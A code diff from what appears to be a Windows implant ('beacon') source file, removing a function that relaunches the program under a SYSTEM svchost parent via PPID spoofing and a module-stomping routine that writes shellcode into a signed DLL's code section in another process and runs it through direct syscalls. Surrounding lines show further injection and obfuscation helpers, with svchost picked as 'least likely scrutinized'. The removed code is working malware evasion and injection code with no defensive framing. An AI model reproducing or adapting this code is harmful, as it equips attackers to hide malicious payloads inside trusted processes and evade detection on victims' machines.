@@ -2,7 +2,6 @@
 // SpawnWithPPID: PPID spoofing via extended startup info attribute.
 // InjectRemoteProcess: full NtOpenProcess → NtAllocateVirtualMemory →
 //   NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx chain.
-// StompModule: module stomping — overwrite .text of a signed DLL in remote process.
 #include "injection.hpp"
 #include "syscalls.hpp"
 #include "obfuscate.hpp"
@@ -87,41 +86,6 @@ BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
     else { ResumeThread(pi.hThread); CloseHandle(pi.hThread); }
 
     return TRUE;
-}
-
-// ============================================================
-// TryRespawnUnderSvchost — relaunch ourselves with svchost PPID.
-// Uses a hidden env-var sentinel (__GHOST_SPAWNED=1) so the child
-// skips this function and continues as the real beacon process.
-// Returns true  → child was launched, caller should exit.
-// Returns false → we ARE the svchost-parented child (keep running).
-// ============================================================
-bool TryRespawnUnderSvchost() {
-    // If sentinel is set we're already the correctly-parented child
-    wchar_t sentinel[4] = {};
-    if (GetEnvironmentVariableW(L"__GHOST_SPAWNED", sentinel, 4) > 0)
-        return false;
-
-    DWORD svchostPid = FindBestSvchost();
-    if (!svchostPid) return false; // no SYSTEM svchost found, just run in-place
-
-    wchar_t selfPath[MAX_PATH] = {};
-    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
-
-    // Set sentinel in our env before spawn — child inherits it (lpEnvironment=NULL).
-    // Child reads it at startup and skips TryRespawnUnderSvchost, runs as the beacon.
-    SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
-    HANDLE hChild = nullptr, hThread = nullptr;
-    if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
-        SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
-        return false;
-    }
-    SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr); // clean our own env
-
-    ResumeThread(hThread);
-    CloseHandle(hThread);
-    CloseHandle(hChild);
-    return true;
 }
 
 // ============================================================
@@ -313,112 +277,6 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     return queued;
 }
 
-// ============================================================
-// Module stomping — overwrite .text section of a signed DLL
-// that already exists in the target process.
-//
-// Steps:
-//   1. Find which signed DLL is already loaded in target.
-//   2. Read its PE to locate .text section (RVA + size).
-//   3. NtProtectVirtualMemory → RW on that region.
-//   4. NtWriteVirtualMemory shellcode into it.
-//   5. NtProtectVirtualMemory → RX.
-//   6. NtCreateThreadEx at stomped base.
-// ============================================================
-BOOL StompModule(DWORD pid, const wchar_t* dllPath,
-                 const BYTE* shellcode, SIZE_T shellcodeSize) {
-    if (!shellcode || shellcodeSize == 0) return FALSE;
-
-    // 1. Open target
-    HANDLE hProc = OpenTarget(pid,
-        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
-        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD);
-    if (!hProc) return FALSE;
-
-    // 2. Find module base in remote process via TH32CS_SNAPMODULE
-    HMODULE remoteBase = nullptr;
-    {
-        HANDLE snap = CreateToolhelp32Snapshot(
-            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
-        if (snap != INVALID_HANDLE_VALUE) {
-            MODULEENTRY32W me = {};
-            me.dwSize = sizeof(me);
-            if (Module32FirstW(snap, &me)) {
-                do {
-                    if (_wcsicmp(me.szExePath, dllPath) == 0) {
-                        remoteBase = me.hModule;
-                        break;
-                    }
-                } while (Module32NextW(snap, &me));
-            }
-            CloseHandle(snap);
-        }
-    }
-
-    if (!remoteBase) {
-        CloseTarget(hProc);
-        return FALSE;
-    }
-
-    // 3. Read remote PE header to find .text section
-    BYTE headerBuf[0x1000] = {};
-    SIZE_T rdBytes = 0;
-
-    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) { CloseTarget(hProc); return FALSE; }
-    auto _ReadProcessMemory = HASHPROC(hKernel32, ReadProcessMemory);
-    if (!_ReadProcessMemory) { CloseTarget(hProc); return FALSE; }
-
-    // Read via ReadProcessMemory (it's just a wrapper; fine here since we're
-    // in injection context and not the syscall-sensitive critical path)
-    if (!_ReadProcessMemory(hProc, remoteBase, headerBuf, sizeof(headerBuf), &rdBytes)) {
-        CloseTarget(hProc); return FALSE;
-    }
-
-    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(headerBuf);
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { CloseTarget(hProc); return FALSE; }
-    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(headerBuf + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE)  { CloseTarget(hProc); return FALSE; }
-
-    // Find .text section
-    PVOID  textVa   = nullptr;
-    SIZE_T textSize = 0;
-    {
-        auto* sec = IMAGE_FIRST_SECTION(nt);
-        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
-            if (memcmp(sec->Name, ".text", 5) == 0) {
-                textVa   = reinterpret_cast<BYTE*>(remoteBase) + sec->VirtualAddress;
-                textSize = sec->Misc.VirtualSize;
-                break;
-            }
-        }
-    }
-
-    if (!textVa || textSize < shellcodeSize) { CloseTarget(hProc); return FALSE; }
-
-    // 4. RW → write shellcode → RX
-    ULONG oldProt = 0;
-    NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(
-        hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
-    if (st != 0) { CloseTarget(hProc); return FALSE; }
-
-    SIZE_T writ = 0;
-    st = g_Syscalls.NtWriteVirtualMemory(hProc, textVa, (PVOID)shellcode, shellcodeSize, &writ);
-    if (st != 0 || writ != shellcodeSize) { CloseTarget(hProc); return FALSE; }
-
-    ULONG dummy = 0;
-    g_Syscalls.NtProtectVirtualMemory(hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READ, &dummy);
-
-    // 5. Create thread at stomped .text base
-    HANDLE hThread = CreateRemoteThreadFallback(hProc, textVa);
-    if (hThread) CloseTarget(hThread);
-    CloseTarget(hProc);
-    return (hThread != nullptr);
-}
-
-// ============================================================
-// FindBestSvchost — pick SYSTEM svchost.exe with lowest PID
-// for migration. Most stable, oldest, least likely scrutinized.
 // ============================================================
 DWORD FindBestSvchost() {
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
